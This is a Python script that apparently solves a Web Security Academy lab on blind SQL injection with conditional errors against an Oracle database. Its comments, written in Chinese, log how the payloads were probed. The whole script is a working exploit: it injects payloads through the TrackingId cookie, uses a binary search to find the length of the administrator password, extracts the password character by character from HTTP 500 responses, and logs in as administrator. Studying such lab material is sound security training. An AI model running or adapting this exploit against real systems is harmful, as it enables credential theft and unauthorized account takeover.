import requests

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"
FILTER_URL = BASE_URL + "/filter"
session = requests.Session()

WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

def payload_test(payload: str) -> requests.Response:
    print(payload)
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    response = session.get(FILTER_URL, params={"category": "Pets"}, cookies=cookies, timeout=10)
    print(response.status_code)
    return response

def find_pw_len() -> int:
    # 二分法比較快
    low = 1
    high = 24
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"'||(SELECT CASE WHEN LENGTH(password)>{mid} THEN TO_CHAR(1/0) ELSE '' END "
            f"FROM users WHERE username='administrator')||'"
        )
        response = payload_test(payload)
        if response.status_code == 500:
            low = mid + 1
        else:
            high = mid - 1
    return low

    
def find_pw(pw_len:int)->str:
    pw = ""
    for num in range(1, pw_len+1):
        for word in WORD_LIST:
            payload=f"'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{word}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            if payload_test(payload).status_code==500:
                pw+=word
                break  
    return pw

def login(password:str):
    import requests
    session = requests.Session()
    url = BASE_URL+"/login"

    get_response = session.get(url,timeout=10)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(get_response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    csrf = csrf_input.get("value")

    body={
        "csrf":csrf,
        "username":"administrator",
        "password":password
    }
    post_response = session.post(url, data=body,timeout=10)
    print(post_response.text)


def main():
    # payload="'"
    # payload_test(payload) #500

    # payload="''"
    # payload_test(payload) #200

    # payload="'||(SELECT '')||'"
    # payload_test(payload) #500

    # 可能是orcale資料庫所以需要from dual
    # payload="'||(SELECT '' from dual )||'"
    # payload_test(payload) #200

    # 沒有這個tablename所以回傳500
    # payload="'||(SELECT '' from aaaa )||'"
    # payload_test(payload) #500

    # payload="'||(SELECT '' from users where username = 'aaa' )||'"
    # payload_test(payload) #200

    # 沒有這個column name 所以回傳500
    # payload="'||(SELECT '' from users where aaa = 'aaa' )||'"
    # payload_test(payload) #500

    # payload="'||(SELECT '' from users where rownum = 1 )||'"
    # payload_test(payload) #200

    # payload="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    # payload_test(payload) #500

    # payload="'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    # payload_test(payload) #200

    # 因為沒有此username，所以select沒有觸發，所以case沒有執行，所以可能因此回傳200
    # payload="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='aaa')||'"
    # payload_test(payload) #200

    # 因為沒有此column name 回傳500
    # payload="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE aaaa='aaa')||'"
    # payload_test(payload) #500
    
    # 有此username，執行case，1/0錯誤，回傳500
    # payload="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    # payload_test(payload) #500

    # payload="'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    # payload_test(payload) #200

    # payload="'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    # payload_test(payload) #500

    pw_len = find_pw_len()
    print(pw_len)

    pw = find_pw(pw_len)
    print(f"[+] Found password: {pw}")

    login(pw)


if __name__ == "__main__":
    main()